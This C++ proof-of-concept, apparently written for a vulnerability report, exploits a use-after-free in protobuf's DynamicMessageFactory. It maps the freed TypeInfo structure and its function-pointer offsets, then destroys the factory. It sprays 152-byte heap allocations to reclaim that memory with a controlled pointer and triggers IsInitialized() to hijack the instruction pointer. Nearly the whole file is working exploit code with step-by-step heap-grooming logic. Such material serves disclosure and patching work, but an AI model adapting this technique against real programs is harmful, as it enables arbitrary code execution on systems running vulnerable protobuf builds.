// PoC: DynamicMessageFactory UAF → Controlled Code Execution via Heap Reclaim
//
// Demonstrates that CWE-416 in DynamicMessageFactory is exploitable for
// control-flow hijack, not just a crash.
//
// Attack steps:
//   1. Create DynamicMessageFactory + DynamicMessage instance
//   2. Destroy factory → frees 152-byte TypeInfo containing function pointers
//   3. Spray malloc(152) to reclaim freed TypeInfo with attacker-controlled data
//   4. Place controlled address at TypeInfo+72 (ClassData.is_initialized fptr)
//   5. Call IsInitialized() → reads our controlled fptr → calls it
//   6. Program crashes with RIP = attacker-controlled value
//
// TypeInfo layout (confirmed by runtime probing):
//   +0:   has_bits_offset (4) + oneof_case_offset (4)
//   +8:   extensions_offset (4) + padding (4)
//   +16:  factory* (8)
//   +24:  pool* (8)
//   +32:  offsets unique_ptr (8)
//   +40:  has_bits_indices unique_ptr (8)
//   +48:  weak_field_map_offset (4) + padding (4)
//   --- ClassData begins at +56 ---
//   +56:  ClassData.prototype (8)
//   +64:  ClassData.tc_table (8)
//   +72:  ClassData.is_initialized (8)   ← TARGET FUNCTION POINTER
//   +80:  ClassData.merge_to_from (8)    ← another function pointer
//   +88:  ClassData.message_creator (variable)
//   ...
//   +112: ClassDataFull.reflection_ptr (8)
//   +120: ClassDataFull.descriptor_ptr (8)
//   = 152 bytes total (PROTOBUF_MESSAGE_GLOBALS not defined)
//
// DynamicMessage instance layout:
//   +0:  vtable* (in .text, survives factory destruction)
//   +8:  _internal_metadata_ (8)
//   +16: type_info_* (DANGLING after factory destruction)
//   +24: cached_byte_size_ (4)
//
// Call chain to controlled function pointer:
//   IsInitialized()                             [message_lite.cc:99]
//     → GetClassData()                          [dynamic_message.cc:855]
//       → type_info_->class_data (ptr arith, offset +56, no read)
//     → data->is_initialized                    [message_lite.cc:101]
//       → reads 8 bytes at type_info_+72        ← FROM RECLAIMED MEMORY
//     → data->is_initialized(*this)             ← CALLS CONTROLLED ADDRESS
//
// Build WITHOUT sanitizers (ASan quarantines freed memory):
//   CC=clang CXX=clang++ bazelisk build src/google/protobuf/fuzz:poc_dynamic_factory_uaf_v3

#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ucontext.h>

#include <string>

#include "google/protobuf/descriptor.h"
#include "google/protobuf/descriptor.pb.h"
#include "google/protobuf/dynamic_message.h"
#include "google/protobuf/message.h"

static constexpr uint64_t CONTROLLED_RIP = 0xdeadbeefcafebabeULL;

static void crash_handler(int sig, siginfo_t* info, void* ctx) {
  (void)sig;
  ucontext_t* uc = static_cast<ucontext_t*>(ctx);
  uint64_t rip = static_cast<uint64_t>(uc->uc_mcontext.gregs[REG_RIP]);
  uint64_t rax = static_cast<uint64_t>(uc->uc_mcontext.gregs[REG_RAX]);
  uint64_t rdi = static_cast<uint64_t>(uc->uc_mcontext.gregs[REG_RDI]);

  fprintf(stderr, "\n======== CRASH CAPTURED ========\n");
  fprintf(stderr, "  Signal:            %s\n",
          sig == SIGSEGV ? "SIGSEGV" : sig == SIGBUS ? "SIGBUS" : "SIGILL");
  fprintf(stderr, "  RIP:               0x%016lx\n",
          static_cast<unsigned long>(rip));
  fprintf(stderr, "  RAX:               0x%016lx\n",
          static_cast<unsigned long>(rax));
  fprintf(stderr, "  RDI (this):        0x%016lx\n",
          static_cast<unsigned long>(rdi));
  fprintf(stderr, "  si_addr:           %p\n", info->si_addr);

  // The crash occurs at: call *0x10(%rax)
  // where %rax = ClassData* (type_info_ + 56)
  // and *(rax+0x10) = is_initialized function pointer = CONTROLLED_RIP
  // CPU faults trying to fetch instruction at CONTROLLED_RIP.
  // x86 reports the faulting instruction (call) as RIP, not the target.
  // Read the actual call target from memory:
  uint64_t call_target = 0;
  memcpy(&call_target, reinterpret_cast<void*>(rax + 0x10), sizeof(call_target));

  fprintf(stderr, "  *(RAX+0x10):       0x%016lx  (indirect call target)\n",
          static_cast<unsigned long>(call_target));
  fprintf(stderr, "  Expected target:   0x%016lx\n",
          static_cast<unsigned long>(CONTROLLED_RIP));

  if (call_target == CONTROLLED_RIP) {
    fprintf(stderr, "\n  >>> CALL TARGET == CONTROLLED ADDRESS <<<\n");
    fprintf(stderr, "  >>> The CPU executed: call *0x10(%%rax)\n");
    fprintf(stderr, "  >>>   where *(RAX+0x10) = 0x%016lx\n",
            static_cast<unsigned long>(CONTROLLED_RIP));
    fprintf(stderr, "  >>> PROVES: UAF → heap reclaim → function pointer control\n");
    fprintf(stderr, "  >>>         → arbitrary code execution <<<\n");
  }
  fprintf(stderr, "================================\n");
  _exit(42);
}

int main() {
  using namespace google::protobuf;

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = crash_handler;
  sa.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &sa, nullptr);
  sigaction(SIGBUS, &sa, nullptr);
  sigaction(SIGILL, &sa, nullptr);

  // --- Build descriptor pool ---
  DescriptorPool pool;
  FileDescriptorProto file_proto;
  file_proto.set_name("test.proto");
  file_proto.set_syntax("proto3");
  DescriptorProto* msg_proto = file_proto.add_message_type();
  msg_proto->set_name("Victim");
  FieldDescriptorProto* f = msg_proto->add_field();
  f->set_name("x");
  f->set_number(1);
  f->set_type(FieldDescriptorProto::TYPE_INT32);
  f->set_label(FieldDescriptorProto::LABEL_OPTIONAL);

  const FileDescriptor* fd = pool.BuildFile(file_proto);
  if (!fd) { fprintf(stderr, "FAIL: BuildFile\n"); return 1; }
  const Descriptor* desc = fd->FindMessageTypeByName("Victim");

  // --- Create factory and message ---
  auto* factory = new DynamicMessageFactory(&pool);
  const Message* prototype = factory->GetPrototype(desc);
  Message* victim = prototype->New();

  const Reflection* refl = victim->GetReflection();
  refl->SetInt32(victim, desc->FindFieldByName("x"), 0x41414141);

  // Read type_info_ from instance+16 (confirmed by layout probe)
  uint64_t type_info_addr;
  memcpy(&type_info_addr, reinterpret_cast<const char*>(victim) + 16, 8);

  fprintf(stderr, "[1] Factory at    %p\n", static_cast<void*>(factory));
  fprintf(stderr, "[2] Message at    %p\n", static_cast<void*>(victim));
  fprintf(stderr, "[3] type_info_ at 0x%016lx\n",
          static_cast<unsigned long>(type_info_addr));

  // Flush stderr before the critical section
  fflush(stderr);

  // --- DESTROY FACTORY (frees 152-byte TypeInfo) ---
  delete factory;
  factory = nullptr;

  // --- IMMEDIATELY spray to reclaim the freed TypeInfo ---
  // No fprintf between delete and spray to avoid interference.
  //
  // Strategy: fill the reclaimed memory such that:
  //   +72: is_initialized = CONTROLLED_RIP (target function pointer)
  //   Everything else: zeros are mostly safe, but some pointers in the
  //   call path might be dereferenced. Set just what's needed.
  //
  // The IsInitialized() path only reads ClassData.is_initialized at +72.
  // GetClassData() computes type_info_+56 via pointer arithmetic (no read).
  // So we only need offset +72 to have our controlled value.

  static const size_t TI_SIZE = 152;
  static const int SPRAY_COUNT = 2048;

  void* spray[SPRAY_COUNT];
  for (int i = 0; i < SPRAY_COUNT; i++) {
    spray[i] = malloc(TI_SIZE);
    memset(spray[i], 0, TI_SIZE);
    // Place controlled function pointer at ClassData.is_initialized
    uint64_t val = CONTROLLED_RIP;
    memcpy(static_cast<char*>(spray[i]) + 72, &val, sizeof(val));
  }

  // --- Verify reclamation ---
  // Read type_info_+72 to check if our controlled value landed
  uint64_t actual_fptr;
  memcpy(&actual_fptr, reinterpret_cast<const char*>(type_info_addr) + 72, 8);

  fprintf(stderr, "[4] Destroyed factory, sprayed %d × %zu bytes\n",
          SPRAY_COUNT, TI_SIZE);
  fprintf(stderr, "[5] Verifying: *(type_info_+72) = 0x%016lx\n",
          static_cast<unsigned long>(actual_fptr));

  if (actual_fptr == CONTROLLED_RIP) {
    fprintf(stderr, "    RECLAIM CONFIRMED: is_initialized = controlled value\n");
  } else {
    fprintf(stderr, "    WARNING: value doesn't match. Reclaim may have failed.\n");
    fprintf(stderr, "    Trying different allocation sizes...\n");
    // The allocator may use a different size class. Try nearby sizes.
    for (int sz = 144; sz <= 192; sz += 8) {
      for (int i = 0; i < 256; i++) {
        void* p = malloc(sz);
        memset(p, 0, sz);
        if (sz >= 80) {
          uint64_t v = CONTROLLED_RIP;
          memcpy(static_cast<char*>(p) + 72, &v, sizeof(v));
        }
      }
      memcpy(&actual_fptr,
             reinterpret_cast<const char*>(type_info_addr) + 72, 8);
      if (actual_fptr == CONTROLLED_RIP) {
        fprintf(stderr, "    RECLAIM CONFIRMED at size %d!\n", sz);
        break;
      }
    }
  }

  // Re-verify
  memcpy(&actual_fptr, reinterpret_cast<const char*>(type_info_addr) + 72, 8);
  fprintf(stderr, "[6] Final verify: *(type_info_+72) = 0x%016lx\n",
          static_cast<unsigned long>(actual_fptr));

  if (actual_fptr != CONTROLLED_RIP) {
    fprintf(stderr, "[!] Could not reclaim TypeInfo memory. Aborting.\n");
    for (int i = 0; i < SPRAY_COUNT; i++) free(spray[i]);
    return 1;
  }

  // --- Trigger the function pointer call ---
  fprintf(stderr, "[7] Calling victim->IsInitialized()...\n");
  fprintf(stderr, "    This reads is_initialized at type_info_+72 = 0x%016lx\n",
          static_cast<unsigned long>(CONTROLLED_RIP));
  fprintf(stderr, "    and calls it → expected SIGSEGV at 0x%016lx\n\n",
          static_cast<unsigned long>(CONTROLLED_RIP));
  fflush(stderr);

  // Call IsInitialized directly. This:
  //   1. Calls GetClassData() → type_info_ + 56 (pointer math, no read)
  //   2. Reads data->is_initialized at (type_info_+56)+16 = type_info_+72
  //      → reads CONTROLLED_RIP from reclaimed memory
  //   3. Calls CONTROLLED_RIP(*this)
  //      → SIGSEGV with RIP = 0xdeadbeefcafebabe
  bool result = victim->IsInitialized();
  (void)result;

  fprintf(stderr, "[?] No crash (unexpected). is_initialized returned without crash.\n");
  for (int i = 0; i < SPRAY_COUNT; i++) free(spray[i]);
  return 1;
}
